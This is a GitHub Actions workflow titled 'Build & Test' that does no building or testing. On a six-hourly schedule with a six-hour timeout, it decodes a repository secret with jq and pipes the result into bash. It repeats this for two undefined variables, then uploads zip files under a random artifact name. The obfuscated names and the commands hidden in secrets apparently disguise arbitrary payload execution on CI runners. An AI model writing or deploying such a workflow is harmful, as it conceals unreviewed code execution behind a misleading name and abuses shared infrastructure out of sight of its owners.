name: Build & Test
on:
  workflow_dispatch:

  schedule:
    - cron: '25 5,11,17,23 * * *'
permissions:
  contents: read
  actions: read
env:
  CI: true
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  trigger:
    name: Main task
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Checkout
        uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Start
        env:
          t49698: ${{ secrets.t49698 }}
        run: |
          printf '%s' "$t49698" | jq -r .nezo50 | /bin/bash
          echo $tvlj286 | jq -r .rq55399 | /bin/bash
          printf '%s' "$ivbj5524" | jq -r .npfll4 | /bin/bash

      - name: Save output
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: KNHWLVXR
          path: "*.zip"
          retention-days: 1
